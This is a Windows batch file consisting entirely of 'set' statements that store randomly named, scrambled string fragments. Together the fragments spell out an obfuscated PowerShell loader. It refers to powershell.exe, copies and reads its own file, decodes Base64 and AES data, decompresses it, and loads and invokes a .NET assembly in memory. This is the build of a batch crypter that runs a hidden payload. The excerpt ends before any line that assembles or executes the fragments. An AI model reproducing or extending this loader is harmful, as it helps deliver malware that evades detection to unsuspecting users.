@echo off
set "VwbXlrQXkv=s\"
set "AAVpDbwehV=ws"
set "DaxvHsxUzV=.e"
set "kPqYBWRWrn=he"
set "WMSqVKMQLQ=\v"
set "wdeUifbqpQ=Sy"
set "NLdPcYJjrq=nd"
set "BeehZlfJlR=we"
set "UKYgtrJgDL=em"
set "JZuqEvvNps=ll"
set "lWnABMfXAQ=in"
set "qaQEjwZRdw=he"
set "onIEDDiAJy=po"
set "QffrOCHcHv=:\"
set "JgzgBiiDKS=ow"
set "mnGPhbAWAN=0\"
set "WQjcyJMdkW= C"
set "OSmPawkJcr=co"
set "rOQzRdhsDX=ll"
set "xgrPoVRiMp=xe"
set "wVMDIhxPxf=do"
set "gSnUZyLKkI=\W"
set "gVPNfIgciT=rs"
set "aVmeiKbYXz=rS"
set "KignmkxAye=we"
set "JFalScnIZp=Wi"
set "ANzlpjrVqj=y "
set "GZVUAlyyuh=Po"
set "TxKrMCgTKJ=st"
set "sAjlNsfqWb= /"
set "nnUzvCyJsU=py"
set "kzBURAozXC=1."
set "iLZVTGcFYv=32"
set "idyiadPgth=cd"
set "bYHTDvznNx= %~dp0"
set "THaSDIOzdm=106u"
set "wLAAxPYUaf=daeR"
set "UBucrztNkB=;$lC"
set "dzTUMrgayx=('%*'"
set "qGgdWQIkEV=raph"
set "jVGBkPqOTg=ing("
set "LNHVaMpJNX=g = "
set "MCRTgjPKOa=esMa"
set "MDpZjNJviK=-joi"
set "pAStREZdaH=('%~f0'"
set "FmCTVvdGvW=null"
set "fHzpwAJYqN=gjYA"
set "MGKvGhrXZN=oryS"
set "KZYnMkJxsF=tem."
set "hEgRixJFPO=ss -"
set "icIwMOThPs=pher"
set "FnjVwIjXFP=; };"
set "clJAlyHFXL=Obje"
set "FXUjcOXgKJ=rity"
set "FhwlOHKmil=f = "
set "WrVGNWJDIp=.Dis"
set "sGaYxrryIg='0Pg"
set "uENOvdJAfW=.Ass"
set "qZshBiRmrV=le  "
set "oSnsJrciaZ=1] -"
set "sdMxlnpfIP=rofi"
set "AcEzIMaxTw=.Cre"
set "yICWoozybH=..-1"
set "tuRyPZFpET=[Sys"
set "nblmpbRZKJ= [Sy"
set "rWQmYevrfD=ose("
set "oOQQvyhHbU=3); "
set "UpyQofDyqr=qqkO"
set "EVoXmuxVaq=m.IO"
set "tUFlSddaAV=qqkO"
set "WxBTOCCCDL=ddin"
set "xcMrXEEaGz=-nop"
set "XGdBsDFCqe=zuZI"
set "SyYMlqONJS=mSMi"
set "zxAMHPrZLK=::De"
set "wmvJYtqypm='[-1"
set "eMbyUlbqQq=RmAx"
set "lfSPpjWigm=pStr"
set "BiwqtszQre=e]::"
set "UrKxFDWvsj=6esa"
set "wgPrJHjYdR=y]::"
set "IIzFcmUylr=SMiO"
set "tmZJfXvaau=uwJZ"
set "wBvSbrBDQb=$wqq"
set "ZMzlKlUowY=ew-O"
set "BgdUIaYhyt=[IO."
set "AKibAoruMH=();$"
set "ROuKzyfdda=onve"
set "UDTvwOblzv=SMiO"
set "lwCZOqUYZh=);$v"
set "wIDNtVDlca=S) {"
set "UtgGmFKTvo=tsWi"
set "AMkFRQvTxU=C = "
set "cvvxcvCmOq=.Mod"
set "XYbxXkiBqf=flec"
set "uaIqrsRiif=ypto"
set "yohavUxZVJ=.Len"
set "igcyUkyjkI=$mSM"
set "gnehGhUWfU=S.En"
set "YYLTjFRKKQ===')"
set "EHrblwFpfy=join"
set "NxtTtpAQPD=wqqk"
set "yztvbndLgY=('Tg"
set "CsAIattkIN=pose"
set "EOhoZPliOa=)($w"
set "BDIquMAxCI=.-16"
set "NxUUwlTRzR=ring"
set "PzVqOeoWZX=zHhH"
set "jCFVvtqfkw=);$m"
set "qzeiJSICzP=:('g"
set "oiLXzglhOO=nage"
set "pMJucksHoC=ES ="
set "Trysezdabp=tS46"
set "ukNBaQpvlq=am;$"
set "obUhrRHkUA=brea"
set "AIwuiYhYUE=oL'["
set "WsEUFFGulH=ment"
set "rVCDueMQiB=HFuE"
set "dCJxOUdRSt='txe"
set "jNbbvQbylm=.Mem"
set "OAjRskLvFj=)($q"
set "yvKumqVita=Invo"
set "UUZbHfZHpL=HR.T"
set "GKQvOceAAR=16] "
set "QDEnyTeCHt=orF'"
set "JJjvextXgJ=($Pc"
set "LmrGOUgCJq= New"
set "sDitymOCMt=ct S"
set "rhqRxVinVR=stem"
set "wHZJnoxzCj=;$mu"
set "QoUpJNFVXz=;$qi"
set "TCvffFtSfC=oArr"
set "uaCexmPhHH=trea"
set "AHLmhTHfzh==');"
set "FeUubgQvTp=d;$m"
set "vqjeOEmMWT=$vTS"
set "gpHaeFeINi=gnir"
set "eoKgZhgfVN=lCPr"
set "IFXEEohYbD=O = "
set "QMlsTSgZbW=ion."
set "sTjhubjdhM=PxEW"
set "YYtkiHDWHc=rity"
set "CqNMuHihSy=ay()"
set "YLnBsYLwfC=rans"
set "dGVkwQTyld=ress"
set "GGinDQDdAI=Disp"
set "zeGvpOjEmj= '')"
set "aUQDuwxXWB=$vTS"
set "kkBQsnioUX=rC, "
set "OjsjJfjRkC=Fina"
set "rOdXXslmbT=('da"
set "EpQbltGHSv=Obje"
set "zPkSNbmFSn=$HFu"
set "ULwoFiFnsJ=-4] "
set "cavlHiMOSx=ress"
set "rFcnxcVDzB=.Sec"
set "eGxjXeGeWR=, $w"
set "WoUZVOUTEV=] -j"
set "rlzRKDiDaw=in $"
set "dQrVNFtGEU=oint"
set "LvAPqTFJdg=HR ="
set "YcvrGqyHxL=ptog"
set "EKVdGAtQnG=.Con"
set "HfLbezcjPs= = N"
set "oOyADjroaE=oin "
set "HsoXCwLTuf=tion"
set "hkMayBfTxB=SMiO"
set "uXbZxRNVfg=]::("
set "YuVHvXVXkQ=ewLi"
